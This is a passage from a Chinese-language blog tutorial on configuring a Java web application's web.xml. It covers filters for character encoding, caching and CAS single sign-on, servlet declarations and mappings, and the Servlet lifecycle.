在web.xml文件中通过配置文件进行配置。<br>我们使用的是web.xml这种配置方式，下面重点介绍&lt;filter&gt;内包含的一些元素。<br>&lt;filter&gt;用于指定Web容器中的过滤器，可包含&lt;filter-name&gt;、&lt;filter-class&gt;、&lt;init-param&gt;、&lt;icon&gt;、&lt;display-name&gt;、&lt;description&gt;。</p><p>&lt;filter-name&gt;：用来定义过滤器的名称，该名称在整个程序中都必须唯一。<br>&lt;filter-class&gt;：指定过滤器类的完全限定的名称，即Filter的实现类。<br>&lt;init-param&gt;：为Filter配置参数，与&lt;context-param&gt;具有相同的元素描述符&lt;param-name&gt;和&lt;param-value&gt;。<br>&lt;filter-mapping&gt;：用来声明Web应用中的过滤器映射，过滤器被映射到一个servlet或一个URL模式。这个过滤器的&lt;filter&gt;和&lt;filter-mapping&gt;必须具有相同的&lt;filter-name&gt;，指定该Filter所拦截的URL。过滤是按照部署描述符的&lt;filter-mapping&gt;出现的顺序执行的。</p><h5 id="字符集过滤器"><a href="#字符集过滤器" class="headerlink" title="字符集过滤器"></a>字符集过滤器</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CharacterEncodingFilter类可以通过简单配置来帮我们实现字符集转换的功能。<br>参数encoding用于指定编码类型，参数forceEncoding设为true时，强制执行request.setCharacterEncoding(this.encoding)和reponse.setCharacterEncoding(this.encoding)中的方法。</p><h5 id="缓存控制"><a href="#缓存控制" class="headerlink" title="缓存控制"></a>缓存控制</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>NoCache Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.yonyou.mcloud.cas.client.authentication.NoCacheFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>NoCache Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">!—表示对URL全部过滤--</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="登录认证"><a href="#登录认证" class="headerlink" title="登录认证"></a>登录认证</h5><p>登录认证，未登录用户导向CAS Server进行认证</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 认证过滤器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Authentication Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.yonyou.mcloud.cas.client.authentication.ExpandAuthenticationFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>casServerLoginUrl<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>https://dev.yonyou.com:443/sso-server/login<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--这里的server是服务端的IP --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>serverName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>http://10.1.215.40:80<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Authentication Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="单点登出"><a href="#单点登出" class="headerlink" title="单点登出"></a>单点登出</h5><p>CAS Server通知CAS Client，删除session，注销登录信息。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Single Sign Out Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.jasig.cas.client.session.SingleSignOutFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Single Sign Out Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.jasig.cas.client.session.SingleSignOutHttpSessionListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="封装request"><a href="#封装request" class="headerlink" title="封装request"></a>封装request</h5><p>封装request, 支持getUserPrincipal等方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;CAS HttpServletRequest Wrapper Filter&lt;&#x2F;filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;org.jasig.cas.client.util.HttpServletRequestWrapperFilter&lt;&#x2F;filter-class&gt;</span><br><span class="line">&lt;&#x2F;filter&gt;</span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;CAS HttpServletRequest Wrapper Filter&lt;&#x2F;filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt;</span><br><span class="line">&lt;&#x2F;filter-mapping&gt;</span><br></pre></td></tr></table></figure><h5 id="存放Assertion到ThreadLocal中"><a href="#存放Assertion到ThreadLocal中" class="headerlink" title="存放Assertion到ThreadLocal中"></a>存放Assertion到ThreadLocal中</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Assertion Thread Local Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.jasig.cas.client.util.AssertionThreadLocalFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Assertion Thread Local Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="禁用浏览器缓存"><a href="#禁用浏览器缓存" class="headerlink" title="禁用浏览器缓存"></a>禁用浏览器缓存</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>NoCache Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.yonyou.mcloud.cas.client.authentication.NoCacheFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>NoCache Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="CAS-Client向CAS-Server进行ticket验证"><a href="#CAS-Client向CAS-Server进行ticket验证" class="headerlink" title="CAS Client向CAS Server进行ticket验证"></a>CAS Client向CAS Server进行ticket验证</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 验证ST/PT过滤器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Validation Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.jasig.cas.client.validation.Cas20ProxyReceivingTicketValidationFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>casServerUrlPrefix<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>https://dev.yonyou.com:443/sso-server<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>serverName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>http://10.1.215.40:80<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>proxyCallbackUrl<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>https://dev.yonyou.com:443/business/proxyCallback<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>proxyReceptorUrl<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/proxyCallback<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>proxyGrantingTicketStorageClass<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>com.yonyou.mcloud.cas.client.proxy.MemcachedBackedProxyGrantingTicketStorageImpl<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 解决中文问题 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Validation Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/proxyCallback<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CAS Validation Filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="lt-servlet-gt-lt-servlet-gt"><a href="#lt-servlet-gt-lt-servlet-gt" class="headerlink" title="&lt;servlet&gt;&lt;/servlet&gt;"></a>&lt;servlet&gt;&lt;/servlet&gt;</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--****************************servlet配置******************************--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Spring view分发器  对所有的请求都由business对应的类来控制转发 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>business<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>publishContext<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 用户登出 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LogOutServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.yonyou.mcloud.cas.web.servlet.LogOutServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>serverLogoutUrl<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>https://dev.yonyou.com:443/sso-server/logout<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>serverName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>http://10.1.215.40:80/business/<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--****************************servlet映射关系配置*************************--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LogOutServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/logout<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>business<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Servlet介绍"><a href="#Servlet介绍" class="headerlink" title="Servlet介绍"></a>Servlet介绍</h4><p>Servlet通常称为服务器端小程序，是运行在服务器端的程序，用于处理及响应客户的请求。Servlet是个特殊的java类，继承于HttpServlet。客户端通常只有GET和POST两种请求方式，Servlet为了响应这两种请求，必须重写doGet()和doPost()方法。大部分时候，Servlet对于所有的请求响应都是完全一样的，此时只需要重写service()方法即可响应客户端的所有请求。另外，HttpServlet有两个方法：</p><p>init(ServletConfig config)：创建Servlet实例时，调用该方法来初始化Servlet资源。<br>destroy()：销毁Servlet实例时，自动调用该方法来回收资源。<br>通常无需重写init()和destroy()两个方法，除非需要在初始化Servlet时，完成某些资源初始化的方法，才考虑重写init()方法，如果重写了init()方法，应在重写该方法的第一行调用super.init(config)，该方法将调用HttpServlet的init()方法。如果需要在销毁Servlet之前，先完成某些资源的回收，比如关闭数据库连接，才需要重写destory方法()。</p><p>Servlet的生命周期，创建Servlet实例有两个时机：</p><p>客户端第一次请求某个Servlet时，系统创建该Servlet的实例，大部分Servlet都是这种Servlet。<br>Web应用启动时立即创建Servlet实例，即load-on-start Servlet。</p><p>每个Servlet的运行都遵循如下生命周期：</p><p>创建Servlet实例。<br>Web容器调用Servlet的init()方法，对Servlet进行初始化。<br>Servlet初始化后，将一直存在于容器中，用于响应客户端请求，如果客户端发送GET请求，容器调用Servlet的doGet()方法处理并响应请求；如果客户端发送POST请求，容器调用Servlet的doPost()方法处理并响应请求。或者统一使用service()方法处理来响应用户请求。<br> Web容器决定销毁Servlet时，先调用Servlet的destory()方法，通常在关闭Web应用时销毁Servlet实例。</p><h4 id="Servlet配置"><a href="#Servlet配置" class="headerlink" title="Servlet配置"></a>Servlet配置</h4><p>为了让Servlet能响应用户请求，还必须将Servlet配置在web应用中，配置Servlet需要修改web.xml文件。从Servlet3.0开始，配置Servlet有两种方式：</p><p>在Servlet类中使用@WebServlet Annotation进行配置。<br>在web.xml文件中进行配置。<br>我们用web.xml文件来配置Servlet，需要配置&lt;servlet&gt;和&lt;servlet-mapping&gt;。&lt;servlet&gt;用来声明一个Servlet。&lt;icon&gt;、&lt;display-name&gt;和&lt;description&gt;元素的用法和&lt;filter&gt;的用法相同。&lt;init-param&gt;元素与&lt;context-param&gt;元素具有相同的元素描述符，可以使用&lt;init-param&gt;子元素将初始化参数名和参数值传递给Servlet，访问Servlet配置参数通过ServletConfig对象来完成，ServletConfig提供如下方法：java.lang.String.getInitParameter(java.lang.String name)，用于获取初始化参数。ServletConfig获取配置参数的方法和ServletContext获取配置参数的方法完全一样，只是ServletConfig是取得当前Servlet的配置参数，而ServletContext是获取整个Web应用的配置参数。</p><h5 id="lt-description-gt-、-lt-display-name-gt-和-lt-icon-gt"><a href="#lt-description-gt-、-lt-display-name-gt-和-lt-icon-gt" class="headerlink" title="&lt;description&gt;、&lt;display-name&gt;和&lt;icon&gt;"></a>&lt;description&gt;、&lt;display-name&gt;和&lt;icon&gt;</h5><ul><li>&lt;description&gt;：为Servlet指定一个文本描述。</li><li>&lt;display-name&gt;：为Servlet提供一个简短的名字被某些工具显示。</li><li>&lt;icon&gt;：为Servlet指定一个图标，在图形管理工具中表示该Servlet。</li></ul><h5 id="lt-servlet-name-gt-、-lt-servlet-class-gt-和-lt-jsp-file-gt-元素"><a href="#lt-servlet-name-gt-、-lt-servlet-class-gt-和-lt-jsp-file-gt-元素" class="headerlink" title="&lt;servlet-name&gt;、&lt;servlet-class&gt;和&lt;jsp-file&gt;元素"></a>&lt;servlet-name&gt;、&lt;servlet-class&gt;和&lt;jsp-file&gt;元素</h5><p>&lt;servlet&gt;必须含有&lt;servlet-name&gt;和&lt;servlet-class&gt;，或者&lt;servlet-name&gt;和&lt;jsp-file&gt;。 描述如下：</p><p>&lt;servlet-name&gt;：用来定义servlet的名称，该名称在整个应用中必须是唯一的。<br>&lt;servlet-class&gt;：用来指定servlet的完全限定的名称。<br>&lt;jsp-file&gt;：用来指定应用中JSP文件的完整路径。这个完整路径必须由/开始。、、</p><h5 id="lt-load-on-startup-gt"><a href="#lt-load-on-startup-gt" class="headerlink" title="&lt;load-on-startup&gt;"></a>&lt;load-on-startup&gt;</h5><p>如果load-on-startup元素存在，而且也指定了jsp-file元素，则JSP文件会被重新编译成Servlet，同时产生的Servlet也被载入内存。&lt;load-on-startup&gt;的内容可以为空，或者是一个整数。这个值表示由Web容器载入内存的顺序。</p><p>举个例子：如果有素两个Servlet元素都含有&lt;load-on-startup&gt;子元，则&lt;load-on-startup&gt;子元素值较小的Servlet将先被加载。如果&lt;load-on-startup&gt;子元素值为空或负值，则由Web容器决定什么时候加载Servlet。如果两个Servlet的&lt;load-on-startup&gt;子元素值相同，则由Web容器决定先加载哪一个Servlet。&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;表示启动容器时，初始化Servlet。</p><h5 id="lt-servlet-mapping-gt"><a href="#lt-servlet-mapping-gt" class="headerlink" 